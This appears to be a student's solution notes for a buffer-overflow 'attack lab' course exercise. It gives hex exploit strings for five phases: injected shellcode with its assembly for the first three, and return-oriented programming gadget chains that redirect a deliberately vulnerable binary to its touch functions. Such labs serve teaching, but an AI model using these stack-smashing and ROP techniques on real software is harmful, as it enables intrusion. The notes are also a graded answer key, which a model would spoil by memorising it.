Phase 1: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 59 19 40 00

Phase 2: 48 c7 c7 1d e8 f8 5a 48 c7 c4 87 a8 60 55 c3 87 19 40 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 78 a8 60 55

0x401987: touch2
0x5560a878: top of stack in getbuf

movq $0x5af8e81d, %rdi /* cookie value */ hex: 35 61 66 38 65 38 31 64
movq $0x5560a887, %rsp /* rsp will take last 8B and start from this memory */
ret

Phase 3: 48 c7 c7 b4 a7 60 55 c7 07 35 61 66 38 c7 47 04 65 38 31 64 c7 47 08 00 00 00 00 c7 47 0c 1d e8 f8 5a 48 c7 c4 a2 a8 60 55 c3 9e 1a 40 00 00 00 00 00 00 00 00 00 00 00 78 a8 60 55

0x401a9e: touch3

movq $0x5560a7b4, %rdi
movl $0x38666135, (%rdi)
movl $0x64313865, 4(%rdi)
movl $0x0, 8(%rdi)
movl $0x5af8e81d, 12(%rdi)
movq $0x5560a8a2, %rsp
ret

Note: struct alignment, create a random place in stack to store stack value and put value in and return address, note hexmatch... could overwrite stack so place struct carefully. Also, we can place struct address above the return address of touch 3. byte code -> touch 3 -> struct

Phase 4: read attacklab.pdf

pop rax ret, mov rax -> rdi ret, address of touch2 

0x401987
0x401b5f    
0x5af8e81d
0x401b52

hex: 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
52 1b 40 00 00 00 00 00 
1d e8 f8 5a 00 00 00 00
5f 1b 40 00 00 00 00 00
87 19 40 00 00 00 00 00

Phase 5: key point: addxy function, using offset to get the address of struct in rsp and mov address to rdi, offset is store in rsi,

00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
37 1c 40 00 00 00 00 00 /* rax = rsp */
5f 1b 40 00 00 00 00 00 /* rdi = rax */
52 1b 40 00 00 00 00 00 /* pop rax */
48 00 00 00 00 00 00 00 /* offset = 72 since when rax = rsp, the first gadget already popped out */
09 1c 40 00 00 00 00 00 /* ecx = eax */
1b 1c 40 00 00 00 00 00 /* edx = ecx */
15 1c 40 00 00 00 00 00 /* esi = edx */
8b 1b 40 00 00 00 00 00 /* rax = rdi + rsi */
5f 1b 40 00 00 00 00 00 /* rdi = rax */
9e 1a 40 00 00 00 00 00 /* touch3 */
35 61 66 38 65 38 31 64 /* struct */
00 00 00 00 1d e8 f8 5a /* struct */
